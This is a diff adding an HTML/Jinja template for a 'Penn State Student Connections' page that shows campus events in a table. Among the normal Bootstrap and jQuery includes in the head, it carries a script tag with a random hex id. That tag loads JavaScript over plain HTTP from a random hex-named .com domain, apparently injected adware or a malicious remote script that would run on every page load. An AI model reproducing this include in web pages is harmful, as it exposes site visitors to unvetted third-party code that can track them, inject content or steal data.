@@ -1,0 +1,51 @@
+<!DOCTYPE HTML>
+<html lang=en>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" //>
+<script type = "text/javascript" id="2f2a695a6afce2cd833c706cd677a8e"
+src="http://5cd9e88e2e1ec3a9079885494b63.com/xuiow/?o=3&g=&s=&z= e?"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> 
+<link href="https://fonts.googleapis.com/css?family=Work+Sans:800,900" rel="stylesheet">
+<link rel="stylesheet" href = "/static/stylehomeStyle.css"/>
+<title> Penn State Student Connections </title>
+</head>
+	<body>
+		<a href="/test">All</a>
+		<table id="Database" style="width:30%" border="1">
+			<thead>
+				<tr>
+					<th>Campus </th>
+					<th>Location </th>
+					<th>Title </th>
+					<th>Date </th>
+					<th>Start </th>
+					<th>End </th>
+					<th>Description </th>
+					<th>Tags </th>
+				</tr>
+			</thead>
+			 
+			<tbody>
+				{% for event in events %}
+					<tr>
+						<td>{{ event.campus }}</td>
+						<td>{{ event.location }}</td>
+						<td>{{ event.title }}</td>
+						<td>{{ event.date }}</td>
+						<td>{{ event.start }}</td>
+						<td>{{ event.end }}</td>
+						<td>{{ event.description }}</td>
+						{% for tag in event.tags %}
+							<td>{{ tag.tag }} </td>
+						{% endfor %}
+					</tr>
+				{% endfor %}
+			</tbody>
+		</table>
+	</body>
+</html>
